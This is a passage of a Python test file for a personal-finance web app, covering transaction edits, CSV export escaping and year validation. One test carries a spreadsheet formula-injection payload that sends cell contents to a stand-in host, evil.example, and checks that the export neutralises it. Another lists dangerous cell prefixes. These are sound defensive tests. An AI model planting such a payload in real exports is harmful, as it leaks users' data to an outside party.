    # dated today: a row dated before an account's balance checkpoint is excluded from
    # the delta by design, and both accounts got checkpointed when they were created
    client.post('/api/transactions', json={
        'date': date.today().isoformat(), 'amount': 100, 'account': 'From',
        'description': 'apple pay top-up', 'tx_type': 'Expense'})
    tid = db.execute("SELECT id FROM transactions WHERE description='apple pay top-up'").fetchone()['id']

    assert client.put(f'/api/transactions/{tid}', json={'tx_type': 'Money Transfer'}).status_code == 400

    res = client.put(f'/api/transactions/{tid}',
                     json={'tx_type': 'Money Transfer', 'account_to': 'To'})
    assert res.status_code == 200, res.get_json()

    accounts = _accounts(client)
    assert accounts['From']['balance'] == -100
    assert accounts['To']['balance'] == 100


def test_csv_export_defuses_spreadsheet_formulas(client, db):
    """Whoever sends you a transfer picks its title, and it lands in the export
    verbatim. Excel runs a cell starting with = + - @ the moment the file opens."""
    attack = '=HYPERLINK("http://evil.example/"&A1,"click")'
    client.post('/api/transactions', json={
        'date': date.today().isoformat(), 'amount': 10, 'account': 'Main account',
        'description': attack, 'tx_type': 'Expense'})

    body = client.get(f'/api/export/transactions.csv?year={date.today().year}').get_data(as_text=True)
    cells = [c for row in csv.reader(io.StringIO(body), delimiter=';') for c in row]
    assert f"'{attack}" in cells, 'formula must reach the sheet quoted out'
    assert attack not in cells, 'unquoted formula still reachable'


def test_csv_cell_leaves_ordinary_text_alone():
    assert badger.csv_cell('Supermarket') == 'Supermarket'
    assert badger.csv_cell('') == ''
    assert badger.csv_cell(None) == ''
    for dangerous in ('=cmd', '+1', '-1', '@SUM', '\ttab', '\rcr'):
        assert badger.csv_cell(dangerous).startswith("'"), dangerous


def test_csv_export_rejects_a_junk_year(client):
    """int() on the raw query string turned a typo into a 500."""
    assert client.get('/api/export/transactions.csv?year=abc').status_code == 400
